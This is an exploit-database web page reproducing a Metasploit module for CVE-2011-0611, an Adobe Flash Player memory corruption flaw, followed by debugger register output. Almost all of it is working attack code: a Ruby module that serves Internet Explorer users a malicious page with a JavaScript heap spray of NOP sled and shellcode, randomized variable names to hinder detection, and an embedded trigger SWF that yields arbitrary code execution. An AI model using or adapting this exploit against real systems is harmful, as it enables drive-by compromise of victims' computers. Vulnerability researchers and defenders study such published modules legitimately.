
[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **Adobe Flash Player 10.2.153.1 SWF Memory Corruption Vulnerability**  **2011.04.18** Credit:  **[metasploit](https://cxsecurity.com/author/metasploit/1/)**  Risk: **High** Local: **No** Remote: ****Yes**** CVE: **[CVE-2011-0611](https://cxsecurity.com/cveshow/CVE-2011-0611/ "Click to see CVE-2011-0611")** CWE: **[NVD-CWE-noinfo](https://cxsecurity.com/cwe/NVD-CWE-noinfo "Click to see NVD-CWE-noinfo")**  CVSS Base Score: **9.3/10** Impact Subscore: **10/10** Exploitability Subscore: **8.6/10** Exploit range: **Remote** Attack complexity: **Medium** Authentication: **No required** Confidentiality impact: **Complete** Integrity impact: **Complete** Availability impact: **Complete** | | --- | |
| --- | --- | --- | --- |

##
# $Id: adobe\_flashplayer\_flash10o.rb 12330 2011-04-16 02:09:33Z sinn3r $
##
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = NormalRanking
include Msf::Exploit::Remote::HttpServer::HTML
def initialize(info={})
super(update\_info(info,
'Name' => "Adobe Flash Player 10.2.153.1 SWF Memory Corruption Vulnerability",
'Description' => %q{
This module exploits a vulnerability in Adobe Flash Player that was discovered, and
has been exploited actively in the wild. By embedding a specially crafted .swf file,
Adobe Flash crashes due to an invalid use of an object type, which allows attackers to
overwrite a pointer in memory, and results arbitrary code execution.
},
'License' => MSF\_LICENSE,
'Version' => "$Revision: 12330 $",
'Author' =>
[
'sinn3r',
],
'References' =>
[
[ 'CVE', '2011-0611' ],
[ 'OSVDB', '71686' ],
[ 'BID', '47314' ],
[ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb11-07.html' ],
[ 'URL', 'http://blogs.technet.com/b/mmpc/archive/2011/04/12/analysis-of-the-cve-2011-0611-adobe-flash-player-vulnerability-exploitation.aspx' ],
[ 'URL', 'http://contagiodump.blogspot.com/2011/04/apr-8-cve-2011-0611-flash-player-zero.html' ],
[ 'URL', 'http://bugix-security.blogspot.com/2011/04/cve-2011-0611-adobe-flash-zero-day.html' ],
[ 'URL', 'http://secunia.com/blog/210' ],
],
'Payload' =>
{
'BadChars' => "\x00",
},
'DefaultOptions' =>
{
'ExitFunction' => "process",
'InitialAutoRunScript' => 'migrate -f',
},
'Platform' => 'win',
'Targets' =>
[
[ 'IE 6/7 on Windows XP SP3 and Windows Vista', {} ],
],
'Privileged' => false,
'DisclosureDate' => "Apr 11 2011",
'DefaultTarget' => 0))
end
def on\_request\_uri(cli, request)
agent = request.headers['User-Agent']
if agent !~ /MSIE \d\.\d/ and agent !~ /NT \d\.\d/
send\_not\_found(cli)
return
end
if request.uri =~ /\.swf/
print\_status("Sending trigger SWF...")
send\_response(cli, @trigger, {'Content-Type'=>'application/x-shockwave-flash'} )
return
end
shellcode = Rex::Text.to\_unescape(payload.encoded, Rex::Arch.endian(target.arch))
nopsled = Rex::Text.to\_unescape( [0x0c0c0c0c].pack('V') \* 8 , Rex::Arch.endian(target.arch))
swf\_name = rand\_text\_alpha(rand(3))
js\_func\_name = rand\_text\_alpha(rand(6) +3)
js\_var\_blocks\_name = rand\_text\_alpha(rand(6) + 3)
js\_var\_shell\_name = rand\_text\_alpha(rand(6) + 3)
js\_var\_nopsled\_name = rand\_text\_alpha(rand(6) + 3)
js\_var\_index\_name = rand\_text\_alpha(rand(6) + 3)
js\_var\_padding\_offset = rand\_text\_alpha(rand(6) + 3)
trigger\_file\_name = "#{get\_resource}/#{swf\_name}.swf"
html = <<-EOS
<html>
<head>
<script>
function #{js\_func\_name}() {
var #{js\_var\_blocks\_name} = new Array();
var #{js\_var\_shell\_name} = unescape("#{shellcode}");
var #{js\_var\_nopsled\_name} = unescape("#{nopsled}");
var #{js\_var\_padding\_offset} = #{js\_var\_shell\_name}.length;
while (#{js\_var\_nopsled\_name}.length < 0x10101) { #{js\_var\_nopsled\_name} += unescape("#{nopsled}") };
#{js\_var\_nopsled\_name} = #{js\_var\_nopsled\_name}.substring(#{js\_var\_padding\_offset}, #{js\_var\_nopsled\_name}.length);
#{js\_var\_blocks\_name}[0] = #{js\_var\_nopsled\_name} + #{js\_var\_shell\_name};
for (#{js\_var\_index\_name}=1; #{js\_var\_index\_name} < 0x802; #{js\_var\_index\_name}++) {
#{js\_var\_blocks\_name}[#{js\_var\_index\_name}] = #{js\_var\_blocks\_name}[0].substring(0, #{js\_var\_blocks\_name}[0].length);
}
}
#{js\_func\_name}();
</script>
</head>
<body>
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="0" height="0"
codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
<param name="movie" value="#{trigger\_file\_name}" />
<embed src="#{trigger\_file\_name}" quality="high" type="application/x-shockwave-flash"
pluginspage="http://www.macromedia.com/go/getflashplayer">
</embed>
</body>
</html>
EOS
html = html.gsub(/^\t\t/, "")
print\_status("Sending malicious HTML to #{cli.peerhost}:#{cli.peerport}")
send\_response(cli, html, {'Content-Type' => "text/html"} )
end
def exploit
path = File.join(Msf::Config.install\_root, "data", "exploits", "CVE-2011-0611.swf")
f = File.open(path, "rb")
@trigger = f.read(f.stat.size)
f.close
super
end
end
=begin
0:000> r
eax=11111110 ebx=00000000 ecx=01d650b0 edx=00000007 esi=0013c2f0 edi=01d650b0
eip=100d01f6 esp=0013c12c ebp=0013c230 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00050202
Flash10o+0xd01f6:
100d01f6 ff5008 call dword ptr [eax+8] ds:0023:11111118=????????
0:000> dd ecx
01d650b0 11111110 00000000 00000000 00000000
01d650c0 00000000 00000000 00000000 00000000
01d650d0 00000000 00000000 00000000 00000000
01d650e0 00000000 00000000 00000000 00000000
01d650f0 00000000 00000000 00000000 00000000
01d65100 00000000 00000000 00000000 00000000
01d65110 00000000 00000000 00000000 00000000
01d65120 00000000 00000000 00000000 00000000
=end

**##### References:**

 http://www.adobe.com/support/security/advisories/apsa11-02.html

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2011040190)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top

